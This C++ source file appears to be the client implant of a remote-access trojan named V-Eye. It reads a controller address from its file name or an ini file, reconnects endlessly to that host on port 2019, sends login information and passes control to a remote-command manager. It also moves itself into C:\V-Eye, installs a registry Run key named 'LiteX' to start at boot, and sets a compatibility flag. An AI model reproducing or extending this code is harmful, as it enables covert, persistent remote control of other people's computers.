
// Server.cpp : 定义应用程序的类行为。
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"

#include "KernelManager.h"
#include "Login.h"
#include <shellapi.h>
#include <direct.h>


#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "vfw32.lib")

BOOL    bisUnInstall = FALSE;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


int main()
{
	// 读取上线地址
	CString strAddr;
	GetPrivateProfileString(_T("Login"),_T("IPAddr"),_T("Error"),strAddr.GetBuffer(MAX_PATH),MAX_PATH,_T("C:\\V-Eye\\V-Eye.ini"));

		// 互斥 上线地址
	HANDLE m_hMutex = CreateMutex(NULL, FALSE, strAddr);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ReleaseMutex(m_hMutex);
		CloseHandle(m_hMutex);
		return 0;
	}

	CClientSocket SocketClient;
	int     nSleep = 0;
	bool	bBreakError = false;
	while (1)
	{
		if (bBreakError != false)
		{
			nSleep = rand();
			Sleep(nSleep % 120000);
		}
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}

		char	lpszHost[256]={0};
		UINT  	dwPort = 0;

    	dwPort = 2019;
		strcat(lpszHost,strAddr);

		if(strcmp(lpszHost,"") == 0)
		{
			bBreakError = true;
			continue;
		}

		DWORD dwTickCount = GetTickCount();
		if (!SocketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = true;
			continue;
		}

		DWORD upTickCount = GetTickCount()-dwTickCount;
		CKernelManager	manager(&SocketClient,lpszHost,dwPort);

		SocketClient.SetManagerCallBack(&manager);

		if(SendLoginInfo(&SocketClient,upTickCount) <= 0)
		{
			SocketClient.Disconnect();
			bBreakError = true;
			continue;
		}

		DWORD	dwIOCPEvent;

		do
		{
			dwIOCPEvent = WaitForSingleObject(
				SocketClient.m_hEvent,
				100);
			Sleep(500);
		} while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);

		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
	}

	return 0;
}


DWORD __stdcall MainThread()
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 1;
}


// CServerApp

BEGIN_MESSAGE_MAP(CServerApp, CWinAppEx)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CServerApp 构造

CServerApp::CServerApp()
{
	// TODO: 在此处添加构造代码，
	// 将所有重要的初始化放置在 InitInstance 中
}


// 唯一的一个 CServerApp 对象

CServerApp theApp;


BOOL IsPathExist(const CString & csPath)
{
	WIN32_FILE_ATTRIBUTE_DATA attrs = { 0 };
	return 0 != GetFileAttributesEx(csPath, GetFileExInfoStandard, &attrs);
}

#include "MainDlg.h"
#include "resource.h"
// CServerApp 初始化
BOOL CServerApp::InitInstance()
{
	CString strName = AfxGetApp()->m_pszAppName;
	int a = strName.ReverseFind('l');
	int b = strName.ReverseFind('v');
	CString strIP = strName.Mid(a+2,b-a-3);

	if (strName.Find(_T("v1")) != -1)//带界面安装
	{
		CMainDlg dlg;
		dlg.DoModal();
	}

	_mkdir(_T("C:\\V-Eye"));//创建目录

	if(strIP.GetLength() != 0)
	{
	    WritePrivateProfileString(_T("Login"),_T("IPAddr"),strIP, _T("C:\\V-Eye\\V-Eye.ini"));//写入上线地址
	}

	if(IsPathExist(_T("C:\\V-Eye\\V-Eye.ini")))
	{
		char szRun[MAX_PATH]=_T("C:\\V-Eye\\V-Eye.exe");
		char szPath[MAX_PATH]={0};
		GetModuleFileName(NULL,szPath,sizeof(szPath));
		MoveFile(szPath,szRun);

		char strSubKey[MAX_PATH] = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("LiteX"), REG_SZ, szRun, lstrlen(szRun), 1);	

		char strSubKey1[MAX_PATH] = _T("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers");
		char strKey[MAX_PATH] = _T("RunAsInvoker");
		WriteRegEx(HKEY_CURRENT_USER, strSubKey1, szRun, REG_SZ, strKey, lstrlen(strKey), 1);	
	}

	MainThread();

	return FALSE;
}
